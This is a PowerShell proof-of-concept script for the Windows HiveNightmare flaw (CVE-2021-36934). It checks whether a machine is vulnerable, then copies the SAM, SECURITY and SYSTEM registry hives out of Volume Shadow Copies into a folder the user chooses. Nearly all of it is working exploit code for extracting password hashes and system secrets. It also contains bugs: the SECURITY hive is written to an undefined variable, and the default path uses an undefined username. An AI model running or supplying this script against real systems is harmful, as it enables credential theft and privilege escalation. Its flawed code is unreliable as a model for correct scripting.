<#
    .SYNOPSIS
        PoC for CVE-2021-36934, which enables a standard user to be able to retrieve the SAM, Security, and security Registry hives in Windows 10 version 1809 or newer. 

        The vulnerability was discovered by @jonasLyk.

    .PARAMETER path
        Used to supply the path to dump the Registry hives. If the parameter isn't used, the path will be default to the user's desktop.

    .EXAMPLE
        PS C:\> .\ShadowDump.ps1 -path "c:\"
        
        Dumps the hives from the system's Volume Shadow Copies to C:\.
        
    .EXAMPLE
        PS C:\> .\ShadowDump.ps1 

        Dumps the hives from the system's Volume Shadow Copies to C:\users\[USERNAME]\desktop.

    .NOTES  
        Modified_By    : @BlackSnufkin
	Created        : 26 Aug 21
	
	File Name      : Invoke-HiveNightmare.ps1
        Version        : v.0.2
        Author         : @WiredPulse
        Created        : 21 Jul 21
	
#>

[CmdletBinding()]
param(
       $path = "C:\Users\$username\Desktop"
)

$ErrorActionPreference = "SilentlyContinue"
$outSam = "$path\Sam.hive"
$outSec = "$path\Sec.hive"
$outSys = "$path\Sys.hive"

if(-not(test-path $path)){
    new-item $path -ItemType Directory | out-null
}

if(([environment]::OSVersion.Version).build -lt 17763){
    Write-Host -ForegroundColor red "[-] System not susceptible to CVE-2021-36934"

}
else{
    Write-Host -ForegroundColor yellow "[!] " -NoNewline; Write-Host -ForegroundColor green "System is a vulnerable version of Windows"
}

$running = (Get-Service vss).Status
    if ($running) {
        Write-Host -ForegroundColor yellow "[!] " -NoNewline;Write-Host -ForegroundColor green "ShadowCopy service is running, system may be vulnerable"
         $vss_running=$True
    } else {
        Write-Host "[*] ShadowCopy service is not running, however snapshots may still be available" -ForegroundColor Yellow
        
                
    }


if (( Get-Acl C:\windows\system32\config\sam).Access | ? IdentityReference -match 'BUILTIN\\Users' | Select-Object -expandproperty filesystemrights | Select-String 'Read') { 
        Write-Host -ForegroundColor yellow "[!] " -NoNewline;Write-Host "Detected improper SAM hive permissions - System may be vulnerable" -ForegroundColor Green
        $sam_vulnerable = $True
         
    } else { 
        Write-Host -ForegroundColor yellow  "[-] "-NoNewline;Write-Host "SAM Permissions Are set correctly" -ForegroundColor Red}
       
        
 if($sam_vulnerable -and $vss_running -eq $True) {
    Write-Host -ForegroundColor yellow "[+] "-NoNewline;Write-Host "All conditions exist for exploit of CVE-2021-36934" -ForegroundColor green}
 else { Write-Host -ForegroundColor yellow  "[-] "-NoNewline;Write-Host "All Hive File Permissions Are set correctly"  -ForegroundColor Red;Write-Host -ForegroundColor yellow "[-] " -NoNewline;Write-Host -ForegroundColor Red "Bye Bye....";break}



for($i = 1; $i -le 9; $i++){
    try{
        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\sam"), ($outSam + $i))
        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SAM$i hive..."
    } catch{}
    try{
        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\security"), ($outSoft + $i))
        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SECURITY$i hive..."
    }
    catch{}
    try{
        [System.IO.File]::Copy(("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $i + "\Windows\System32\config\system"), ($outSys + $i))
        Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Dumping SYSTEM$i hive..."
    }
    catch{}
}
if(test-path $path\s*.hive*){
    Write-Host -ForegroundColor yellow "[+] " -NoNewline; Write-Host -ForegroundColor green "Hives are dumped to $path"
}
else{
    Write-Host -ForegroundColor red "[-] There are no Volume Shadow Copies on this system"
}
